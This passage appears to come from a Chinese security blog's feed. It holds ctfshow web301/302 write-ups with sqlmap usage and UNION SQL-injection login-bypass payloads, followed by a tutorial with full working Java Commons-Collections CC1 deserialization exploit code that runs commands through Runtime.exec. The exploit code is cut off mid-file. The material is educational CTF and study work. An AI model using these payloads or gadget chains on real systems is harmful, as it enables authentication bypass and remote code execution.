class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>; </span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>fun.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>给的代码里主要的就是这两个代码了，那么我们就可以对这个代码进行审计一下</p><p>我们进行审计发现这个代码sql是没有waf的，那么我们就可以尝试去进行一下<strong>sqlmap</strong>工具的利用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>f06618b6<span class="number">-6697</span><span class="number">-4</span>bc5<span class="operator">-</span>a506<span class="number">-50</span>b8e9ce7739.challenge.ctf.show<span class="operator">/</span>checklogin.php <span class="comment">--form --batch --dump</span></span><br></pre></td></tr></table></figure><p>yu师傅使用的这个工具就会全部导出数据库  表  列  和列里面的东西</p><p><img src="../images/image-20230318221422214.png" alt="image-20230318221422214"></p><p>最后就会拿到账号密码了</p><p><img src="../images/image-20230318221525179.png" alt="image-20230318221525179"></p><p>拿到flag了</p><p>这里的话代码中又有一个逻辑漏洞</p><p><img src="../images/image-20230318221733657.png" alt="image-20230318221733657"></p><p>这里就是只要我们输入的密码和数据库中的密码相等就行了</p><p>他这里是利用sql语句来查找数据库中的密码，这里我们就可以进行控制数据库中的密码</p><p><img src="../images/image-20230318223043391.png" alt="image-20230318223043391"></p><p>当前面查询不存在时，就会使用后面定义的值</p><p><strong>paylaod</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><p>题目</p><p>给了给题目说明</p><p><strong>修改的地方</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="title function_ invoke__">sds_decode</span>(<span class="variable">$userpwd</span>),<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>这里修改了这，那么就会对我们传进来的userpwd进行加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为我们传进来的str是1，所以就可以利用这个写好的php代码来进行生成加密后的值</p><p><img src="../images/image-20230318225948652.png" alt="image-20230318225948652"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select &quot;d9c77c4e454869d5d8da3b4be79694d3&quot;#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>然后在重新修改一下sql语句</p><p>然后这道题就完成，这只是简单的对用户传进来的密码进行加密而已，然后又给了加密代码，所以这样就能通过给的加密代码判断出加密的值了</p><h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>题目</p><p>这次换源码了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web301&quot;&gt;&lt;a href=&quot;#web301&quot; class=&quot;headerlink&quot; title=&quot;web301&quot;&gt;&lt;/a&gt;web301&lt;/h2&gt;&lt;p&gt;题目(给了源码)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;checklogin.php&lt;/strong&gt;&lt;/p&gt;
&lt;f</summary>
      
    
    
    
    
    <category term="ctfshow 代码审计" scheme="https://ke1nys.github.io/tags/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-cc1</title>
    <link href="https://ke1nys.github.io/posts/488024db.html"/>
    <id>https://ke1nys.github.io/posts/488024db.html</id>
    <published>2023-03-16T13:57:31.000Z</published>
    <updated>2023-04-06T06:48:36.151Z</updated>
    
    <content type="html"><![CDATA[<p>我是看这个视频来进行学习的 <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">cc1</a></p><p>这里的话不要跳过视频里的那个安装调试包的代码，跳过的话就会复现不了，得一步一步跟着做</p><p>这个cc1链的危险方法就是发现了Transformer接口</p><p><img src="../images/image-20230316222922808.png" alt="image-20230316222922808"></p><p>然后利用里面的这个transform函数</p><p><img src="../images/image-20230316223143480.png" alt="image-20230316223143480"></p><p>这里话就是本篇文章主要讲的地方，就是利用这个函数，来进行操作</p><p>这里面还写一个反射调用，并且里面的值还可控，这就是造成任意方法调用了，所以这就是这个链子的入口</p><p>这里的话，我们可以尝试利用这个函数来弹个计算器</p><p><img src="../images/image-20230316225007753.png" alt="image-20230316225007753"></p><p>这里是<code>InvokerTransformer</code>的构造函数方法，结合上面的图片，可知通过这个构造函数传参从而弹个计算器</p><p><img src="../images/image-20230317164525497.png" alt="image-20230317164525497"></p><p>这就成功弹出了一个计算器</p><p><strong>发现这里可以任意函数调用后，那么我们就得去找谁的里面调用transformer</strong></p><p><img src="../images/image-20230317165005890.png" alt="image-20230317165005890"></p><p>查找后发现有21个调用，那么我们就得从里面找到一个合适的方法</p><p>(得找一个不同名的函数里面时调用transformer的)</p><p>然后我们就找到了这个方法是调用transformer的(是在TransformedMap类里边的)</p><p><img src="../images/image-20230317170511870.png" alt="image-20230317170511870"></p><p><img src="../images/image-20230317165356791.png" alt="image-20230317165356791"></p><p>然后我们就跟进看一下<code>valueTransformer</code>是什么东西</p><p><img src="../images/image-20230317165605279.png" alt="image-20230317165605279"></p><p>是有一个保护的函数方法来给他赋值，那我们继续跟进，看一下咋调用这个函数方法</p><p>然后就发现这里有个decorate方法调用了这个函数方法，并且还可以传值</p><p><img src="../images/image-20230317165703877.png" alt="image-20230317165703877"></p><p>因为这个decorate里边需要传一个map类，所以我们就新建一个map类来传参。</p><p><img src="../images/image-20230317170703239.png" alt="image-20230317170703239"></p><p>这里只要写是因为checkvalue里只用到了valuetransformer,所以keytransfomer就为null.</p><p>但是这里虽然是能调用到了transfomer方法，但是checkvalue里的value不可控，所以我们就继续去找谁里面调用了checkvalue方法</p><p><img src="../images/image-20230317171128586.png" alt="image-20230317171128586"></p><p>在这里发现了一个抽象类里边的setvalue是调用这个方法的，并且我们还发现了这个抽象类是transformedMap的父类</p><p><img src="../images/image-20230317171449070.png" alt="image-20230317171449070"></p><p><img src="../images/image-20230317171308361.png" alt="image-20230317171308361"></p><p>那么我们就接着去找谁调用了setvalue方法</p><p>这里话是利用MapEntry遍历来调用setvalue方法的</p><p><img src="../images/image-20230317172617863.png" alt="image-20230317172617863"></p><p>这样写就能成功调用setvalue了</p><p>首先，这里给hashmap.put(“key”,”value”)的原因是简单创建一个key值，为了下方的遍历提供内容，不写的话就不会进行for循环里的遍历</p><p>这里是先for循环进行遍历，然后调用setvalue(这个时候的value值已经传进去了)里面的checkvalue,然后checkvalue就会根据传的valuetransformer进行调用transfomer.</p><p>然后就会弹计算器了</p><p><strong>接下来我们继续找谁调用了setvalue方法</strong></p><p>这里最好的想法是直接找谁的readobject里面调用了setvalue方法，如果没找到的话就和上面一样的方法 ，看谁里面调用了setvalue方法，最后的归宿都是找readobject里面调用了xxx方法</p><p><img src="../images/image-20230317175443088.png" alt="image-20230317175443088"></p><p><img src="../images/image-20230317175529057.png" alt="image-20230317175529057"></p><p>在这个类里边的方法找到了调用setvalue的方法</p><p><img src="../images/image-20230317175649684.png" alt="image-20230317175649684"></p><p>并且这个memberValues可控，那么我们就可以限定调用哪个类的setvalue方法了</p><p>这里有一个小问题就是这个类不是public类型，是一个default类型</p><p>那么不能直接调用了</p><p><img src="../images/image-20230317180005106.png" alt="image-20230317180005106"></p><p>必须得在这个包里才能调用了，所以这里我们就是用反射的方法进行调用了</p><p><img src="../images/image-20230317184552260.png" alt="image-20230317184552260"></p><p>反射的方法就写好了，这里为什么能传map，是因为这个setvalue所在的类是transformedMap的父类，然后传的map是TransformerMap类创建的，所以在反序列化的时候就会调用到那个抽象类里边的setvalue方法，这里写的Override的原因是因为下图的这个构造函数里边要求的注释class</p><p><img src="../images/image-20230317185333816.png" alt="image-20230317185333816"></p><p>这里有个不好的点就是value没法控制，所以得想办法来传value</p><p>还有就是这里的Runtime是没法进行序列化的(因为没有继承serializeble)</p><p><img src="../images/image-20230317194226941.png" alt="image-20230317194226941"></p><p>还有就是这里的两个if也要判断绕过</p><p><img src="../images/image-20230317194329316.png" alt="image-20230317194329316"></p><p>所以上面一共有三个问题要进行解决</p><p><strong>先解决runtime序列化问题</strong></p><p>这里的话先写出反射的方法，然后在写到<code>InvokerTransformer</code>上</p><p><img src="../images/image-20230317195857622.png" alt="image-20230317195857622"></p><p>因为class能进行序列化，而Runtime不行，所以就使用反射来写</p><p>接下来我们把这段代码与InvokerTransformer结合来写</p><p>这也是个反射方法(写在函数内部的)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230317202145679.png" alt="image-20230317202145679"></p><p><img src="../images/image-20230317202207893.png" alt="image-20230317202207893"></p><p>这段代码写的有点绕，就是利用InvokerTransformer类里边transform的反射在利用一遍，就是利用反射获取到Runtime.class的getMethod方法，然后第二位置就是传参数，第三位置就是传invoke需要的东西，就是有点嵌套的感觉，慢慢看就能把这个代码看懂了</p><p>就是根据，没用InvokerTransformer之前写的runtime反射代码来写，一步一步用InvokerTransformer来写反射来进行替换</p><p>接下来就到替换invoke了<img src="../images/image-20230317202631561.png" alt="image-20230317202631561"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(method);</span><br></pre></td></tr></table></figure><p>这个和上面的第一次解释一样，也是和嵌套一样</p><p>上面是到Runtime.getRuntime()了，那么我们接下来直接写”exec”直接反射调用弹计算器了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>这句代码就没那么抽象了，不像前两个那么抽象</p><p><img src="../images/image-20230317204314863.png" alt="image-20230317204314863"></p><p>这就是替换掉之前写的没加InvokerTransformer的反射调用了，然后就可以弹计算器了</p><p>这里还暴露了一个弊端就是老是嵌套用法，前一个调用后一个，老是调用tranformer里面的反射，所以这里就利用<code>ChainedTransformer</code>来解决这个问题</p><p><img src="../images/image-20230317205703565.png" alt="image-20230317205703565"></p><p>就是图片上两个函数，就是靠这两个来进行替换掉</p><p><img src="../images/image-20230317210240200.png" alt="image-20230317210240200"></p><p>然后就写好了这里就只有Runtime.class是我们可控的，其他只是起个变量名的作用而已</p><p>解决完Runtime不能反序列化后，这里就得解决那两个if判断的问题了</p><p><strong>绕过if两个判断</strong></p><p><img src="../images/image-20230317211434930.png" alt="image-20230317211434930"></p><p>这里的memberValue是传进来的map，在外面已经定义好了</p><p><img src="../images/image-20230317214237583.png" alt="image-20230317214237583"></p><p>并且已经有key值了，但是因为这里的key找的是map里的，但是找这个key值却是memberType的，就Override这个东西，这个东西是没有value()值的，所以我们就换一个注释函数</p><p><img src="../images/image-20230317214436564.png" alt="image-20230317214436564"></p><p>这个是有value()值的，名字也为value，所以我们就想着把<code>hashMap.put(&quot;key&quot;,&quot;aaa&quot;);</code>改为<code>hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</code>那么就能绕过判断了</p><p>那么接下来就剩value的值怎么进行控制了</p><p><strong>控制setvalue里的value值</strong></p><p>那么我们这里就可以利用这个<code>ConstantTransformer</code>类来进行解决这个问题</p><p><img src="../images/image-20230317215731924.png" alt="image-20230317215731924"></p><p>就是利用这一点，不管transform传啥值，最后返回的都是固定的东西，那么我们只需要控制这个固定的东西就行</p><p><img src="../images/image-20230317220314223.png" alt="image-20230317220314223"></p><p>新增加这一行就解决了这个value不能控制的问题了，就是在setvalue调用到checkvalue那边的时候，然后就会调用<code>chainedTransformer.transformer</code>方法，然后因为在数组中因为有<code>ConstantTransformer(Runtime.class)</code>存在就会调用<code>ConstantTransformer.transformer</code>,然后就会返回一个Runtime.class,那么这个value就成功可控了，接下来就是循环嵌套了，名字影响不大</p><p>这里不管<code>chainedTransformer.transformer</code>传进来什么value，<code>ConstantTransformer.transformer</code>都会固定返回Runtime.class</p><p><strong>然后就全部跟完了</strong></p><p><strong>cc1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//     chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntime是无参函数</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">////        &#123;</span></span><br><span class="line"><span class="comment">////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面写的非常详细了，有疑问的时候可以回来温习一下</p><p><strong>接下来还有个lazyMap版本</strong></p><p>我们在上面写的是<code>TransformedMap</code>版本，因为在看谁调用了transformer的时候，发现了还有lazyMap这个类，然后又巧妙的发现了这个类可以用，于是就有了这个版本</p><p><img src="../images/image-20230318103058344.png" alt="image-20230318103058344"></p><p>lazyMap的get()方法，那么我们就和上面的思路一样，找谁调用了get()方法</p><p><img src="../images/image-20230318103911715.png" alt="image-20230318103911715"></p><p>然后在这个类里边发现了get方法，并且这个memberValue可控</p><p><img src="../images/image-20230318104007111.png" alt="image-20230318104007111"></p><p>是在这个invoke方法里面</p><p>所以这里得用动态代理方法</p><p>思路就是<code>AnnotationInvocationHandler.readObject</code>里面传一个动态代理方法，然后动态代理就会使用invoke，invoke里面就会调用lazyMap.get方法(因为memberValues可控)，然后get方法里面就传一个<code>chainedTransformer</code>(get里面调用了transfom方法),然后就能弹计算器了</p><p><img src="../images/image-20230318110547425.png" alt="image-20230318110547425"></p><p>写好了，进行对这段代码进行解释一下</p><p>这里的LazyMap的decorate方法和TransformedMap.decorate方法是一个意思，这里就不多说了，下面的实例化对象使用InvocationHandler是因为readObject所在的AnnotationInvocationHandler是继承于InvocationHandler的(还有一点是不能使用这个AnnotationInvocationHandler    可以自己去idea里面试一下)  </p><p>这里传的lazyMap就是可控的memberValues,在反序列化的时候这个memberValues就会调用这个entrySet()方法，因为这个方法是无参的，能符合接下来动态代理调用的invoke方法里调用get的条件，下面那行写的<code>xProxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>方法就是为了调用invoke方法，从而调用到lazymap里的get方法，然后get的方法就会调用chainedTransformer.tranfome方法，从而实现命令执行。</p><p><img src="../images/image-20230318112157242.png" alt="image-20230318112157242"></p><p>最后再补充一点就完成了</p><p>因为我们是想在readObject里面执行，然后刚好readobject所在的这个类是接收map类的，然后动态代理的话是必须得跟一个接口的，所以就<code>Map map = (Map) Proxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>这样来写，然后在实例化一下，把东西传进去，然后进行序列化</p><p><strong>写好的链子</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import 